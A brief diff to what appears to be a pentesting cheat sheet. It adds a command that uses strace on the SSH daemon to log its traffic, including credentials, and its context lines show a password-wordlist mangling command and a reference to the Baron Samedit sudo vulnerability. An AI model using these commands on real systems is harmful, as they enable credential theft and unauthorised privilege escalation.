@@ -121,6 +121,7 @@
 
 
 ## Linux
+* SSH Snooping: `strace -o /tmp/ssh_log -ff -s8192 -T -ttt -fp $(pidof sshd)`
 * Password bruteforce wordlist mangling generation:
     * `rsmangler -p -d -r -t -T -c -u -l -s -e -I --punctuation -a -C --pna --pnb --na -nb --force --space --file words.txt --output wordsmangled.txt`
 * Baron Samedit sudo vuln (CVE-2021-3156) - 1.8.2 to 1.8.31p2 and 1.9.0 to 1.9.5p1
